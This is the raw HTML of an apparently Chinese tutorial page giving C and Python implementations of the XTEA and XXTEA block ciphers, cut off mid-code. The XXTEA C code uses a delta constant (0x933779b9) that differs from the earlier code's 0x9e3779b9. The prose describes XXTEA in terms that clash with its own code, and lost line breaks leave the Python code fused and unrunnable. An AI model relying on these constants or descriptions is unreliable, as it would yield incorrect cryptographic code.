punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> r<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">;</span><span class="token comment">//这里是加密轮数，自己设置 </span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密前原始数据：%u %u\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">encipher</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span>v<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密后原始数据：%u %u\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">decipher</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span>v<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密后原始数据：%u %u\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>python版</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>v0<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>v1<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>sum1<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delta<span class="token operator">=</span><span class="token number">0x9e3779b9</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>v0<span class="token punctuation">.</span>value<span class="token operator">+=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token punctuation">.</span>value<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v1<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>v1<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>sum1<span class="token punctuation">.</span>value<span class="token operator">+</span>k<span class="token punctuation">[</span>sum1<span class="token punctuation">.</span>value<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>sum1<span class="token punctuation">.</span>value<span class="token operator">+=</span>deltav1<span class="token punctuation">.</span>value<span class="token operator">+=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0<span class="token punctuation">.</span>value<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v0<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>v0<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>sum1<span class="token punctuation">.</span>value<span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token punctuation">(</span>sum1<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">11</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">return</span> v0<span class="token punctuation">.</span>value<span class="token punctuation">,</span>v1<span class="token punctuation">.</span>value <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>v0<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>v1<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>delta<span class="token operator">=</span><span class="token number">0x9e3779b9</span>sum1<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>delta<span class="token operator">*</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>v1<span class="token punctuation">.</span>value<span class="token operator">-=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0<span class="token punctuation">.</span>value<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v0<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>v0<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>sum1<span class="token punctuation">.</span>value<span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token punctuation">(</span>sum1<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">11</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>sum1<span class="token punctuation">.</span>value<span class="token operator">-=</span>deltav0<span class="token punctuation">.</span>value<span class="token operator">-=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token punctuation">.</span>value<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v1<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>v1<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>sum1<span class="token punctuation">.</span>value<span class="token operator">+</span>k<span class="token punctuation">[</span>sum1<span class="token punctuation">.</span>value<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">return</span> v0<span class="token punctuation">.</span>value<span class="token punctuation">,</span>v1<span class="token punctuation">.</span>value <span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>k<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密前数据:"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span>res<span class="token operator">=</span>encrypt<span class="token punctuation">(</span>a<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密后的数据:"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span>res<span class="token operator">=</span>decrypt<span class="token punctuation">(</span>res<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"解密后数据:"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="xxtea"><a class="markdownIt-Anchor" href="#xxtea"></a> XXTEA</h1><h2 id="介绍-3"><a class="markdownIt-Anchor" href="#介绍-3"></a> 介绍</h2><p>XXTEA算法介绍：</p><p>XXTEA，又称Corrected Block TEA，是XTEA的升级版 ，设计者是Roger Needham, David Wheeler。</p><p>XXTEA是一个非平衡Feistel网络分组密码，在可变长度块上运行，这些块是32位大小的任意倍数（最小64位），使用128位密钥, 是目前TEA系列中最安全的算法，但性能较上两种有所降低。</p><p>算法流程如下</p><ol><li><strong>输入和密钥设置</strong>：<ul><li>输入数据被分成32位无符号整数的块。</li><li>密钥通常由4个32位无符号整数组成。</li><li>数据块和密钥的选择取决于应用的具体需求。</li></ul></li><li><strong>轮迭代</strong>：<ul><li>XXTEA算法的加密和解密都采用迭代的方式，通常是32轮。</li><li>迭代中的基本操作是对两个32位无符号整数进行加密或解密。</li></ul></li><li><strong>加密过程</strong>：<ul><li>对每一轮的迭代，先将待加密数据分成两个32位部分（通常称为v0和v1）。</li><li>使用轮密钥对数据进行操作。密钥也分为两个32位部分，通常称为k0和k1。</li><li>执行一系列位运算和加法运算，包括左移、右移、异或等。</li><li>对每轮迭代的结果进行累加。</li></ul></li><li><strong>解密过程</strong>：<ul><li>解密过程与加密过程相反，同样进行32轮迭代。</li><li>对每一轮的迭代，使用轮密钥进行操作，执行一系列位运算和减法运算。</li><li>对每轮迭代的结果进行累减。</li></ul></li><li><strong>最后的结果</strong>：<ul><li>经过32轮迭代后，得到加密或解密后的数据块。</li></ul></li></ol><p>图解为</p><p><img src="https://s2.loli.net/2024/02/17/MbJge6XIDzVvZ1U.png" alt="" / loading="lazy"></p><h2 id="实现-3"><a class="markdownIt-Anchor" href="#实现-3"></a> 实现</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">0x933779b9</span> </span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MX</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z<span class="token operator">>></span><span class="token number">5</span><span class="token operator">^</span>y<span class="token operator">&lt;&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>y<span class="token operator">>></span><span class="token number">3</span><span class="token operator">^</span>z<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>sum<span class="token operator">^</span>y<span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>p<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">^</span>e<span class="token punctuation">]</span><span class="token operator">^</span>z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token comment">//MX是一个混淆运算宏</span><span class="token keyword">void</span> <span class="token function">btea</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> <span class="token operator">*</span>v<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">,</span><span class="token class-name">uint32_t</span> <span class="token keyword">const</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">uint32_t</span> y<span class="token punctuation">,</span>z<span class="token punctuation">,</span>sum<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> p<span class="token punctuation">,</span>rounds<span class="token punctuation">,</span>e<span class="token punctuation">;</span>    <span class="token comment">//加密算法</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        rounds<span class="token operator">=</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">52</span><span class="token operator">/</span>n<span class="token punctuation">;</span> <span class="token comment">//这个可以说是预定义值，n=2是rounds=32,n</span>        sum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>      <span class="token comment">//n是多少就把密文分为n部分</span>        z<span class="token operator">=</span>v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">//z是待处理数据块的最后一个32位部分</span>        <span class="token keyword">do</span><span class="token punctuation">&#123;</span>            sum<span class="token operator">+=</span>DELTA<span class="token punctuation">;</span>            e<span class="token operator">=</span><span class="token punctuation">(</span>sum<span class="token operator">>></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">;</span>  <span class="token comment">//e用于计算每轮的轮密钥</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>p<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>p<span class="token operator">&lt;</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>p<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                y<span class="token operator">=</span>v<span class="token punctuation">[</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                z<span class="token operator">=</span>v<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token operator">+=</span>MX<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            y<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            z<span class="token operator">=</span>v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+=</span>MX<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//解密算法</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>n<span class="token operator">&lt;</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        n<span class="token operator">=</span><span class="token operator">-</span>n<span class="token punctuation">;</span>        rounds<span class="token operator">=</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">52</span><span class="token operator">/</span>n<span class="token punctuation">;</span>        sum<span class="token operator">=</span>rounds<span class="token operator">*</span>DELTA<span class="token punctuation">;</span>        y<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">do</span>        <span class="token punctuation">&#123;</span>            e<span class="token operator">=</span><span class="token punctuation">(</span>sum<span class="token operator">>></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>p<span class="token operator">=</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>p<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span>p<span class="token operator">--</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                z<span class="token operator">=</span>v<span class="token punctuation">[</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                y<span class="token operator">=</span>v<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token operator">-=</span>MX<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            z<span class="token operator">=</span>v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            y<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-=</span>MX<span class="token punctuation">;</span>            sum<span class="token operator">-=</span>DELTA<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//密文</span>    <span class="token class-name">uint32_t</span> <span class="token keyword">const</span> k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密前原始数据:%u %u\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">btea</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span>n<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密后数据:%u %u\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">btea</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span><span class="token operator">-</span>n<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密后数据:%u %u\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Python版本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token keyword">def</span> <span class="token function">MX</span><span class="token punctuation">(</span>z<span class="token punctuation">,</span> y<span class="token punctuation">,</span> sum1<span class="token punctuation">,</span> k<span class="token punctuation">,</span> p<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> c_uint32<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">5</span><span class="token operator">^</span>y<span class="token punctuation">.</span>value<span class="token operator">&lt;&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>y<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">3</span><span class="token operator">^</span>z<span class="token punctuation">.</span>value<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>sum1<span class="token punctuation">.</span>value<span class="token operator">^</span>y<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token punctuation">(</span>p<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">^</span>e<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token operator">^</span>z<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">btea</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span>k<span class="token punctuation">,</span>n<span class="token punctuation">,</span>delta<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">if</span> n<span class="token operator">></span><span class="token number">1</span><span class="token punctuation">:</span>sum1<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>z<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>rounds<span class="token operator">=</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">52</span><span class="token operator">//</span>ne<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">while</span> rounds<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>sum1<span class="token punctuation">.</span>value<span class="token operator">+=</span>deltae<span class="token punctuation">.</span>value<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>sum1<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment">#e都要32位哦</span><span class="token keyword">for</span> p <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>y<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#v[p]=c_uint32(v[p]+c_uint32((((z.value>>5^y.value&lt;&lt;2)+(y.value>>3^z.value&lt;&lt;4))^((sum1.value^y.value)+(k[(p&amp;3)^e.value]^z.value)))).value).value</span>v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">=</span> c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">+</span> MX<span class="token punctuation">(</span>z<span class="token punctuation">,</span>y<span class="token punctuation">,</span>sum1<span class="token punctuation">,</span>k<span class="token punctuation">,</span>p<span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span>valuez<span class="token punctuation">.</span>value<span class="token operator">=</span>v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> y<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#v[n-1]=c_uint32(v[n-1]+c_uint32((((z.value>>5^y.value&lt;&lt;2)+(y.value>>3^z.value&lt;&lt;4))^((sum1.value^y.value)+(k[((n-1)&amp;3)^e.value]^z.value)))).value).value#这里tmd传入的是k[((n-1)&amp;3)啊我草，找了半天！！！</span>v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> MX<span class="token punctuation">(</span>z<span class="token punctuation">,</span>y<span class="token punctuation">,</span>sum1<span class="token punctuation">,</span>k<span class="token punctuation">,</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span>valuez<span class="token punctuation">.</span>value<span class="token operator">=</span>v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>rounds<span class="token operator">-=</span><span class="token number">1</span> <span class="token keyword">else</span><span class="token punctuation">:</span>sum1<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>n<span class="token operator">=</span><span class="token operator">-</span>nrounds<span class="token operator">=</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">52</span><span class="token operator">//</span>nsum1<span class="token punctuation">.</span>value<span class="token operator">=</span>rounds<span class="token operator">*</span>deltay<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>e<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">while</span> rounds<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>e<span class="token punctuation">.</span>value<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>sum1<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment">#e都要32位哦</span><span class="token keyword">for</span> p <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>z<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#y[p]=c_uint32(v[p]-c_uint32((((z.value>>5^y.value&lt;&lt;2)+(y.value>>3^z.value&lt;&lt;4))^((sum1.value^y.value)+(k[(p&amp;3)^e.value]^z.value)))).value).value</span>v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">=</span> c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">-</span> MX<span class="token punctuation">(</span>z<span class="token punctuation">,</span>y<span class="token punctuation">,</span>sum1<span class="token punctuation">,</span>k<span class="token punctuation">,</span>p<span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span>valuey<span class="token punctuation">.</span>value<span class="token operator">=</span>v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> z<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#v[n-1]=c_uint32(v[n-1]-c_uint32((((z.value>>5^y.value&lt;&lt;2)+(y.value>>3^z.value&lt;&lt;4))^((sum1.value^y.value)+(k[((n-1)&amp;3)^e.value]^z.value)))).value).value#这里tmd传入的是k[((n-1)&amp;3)啊我草，找了半天！！！</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> MX<span class="token punctuation">(</span>z<span class="token punctuation">,</span>y<span class="token punctuation">,</span>sum1<span class="token punctuation">,</span>k<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span>valuey<span 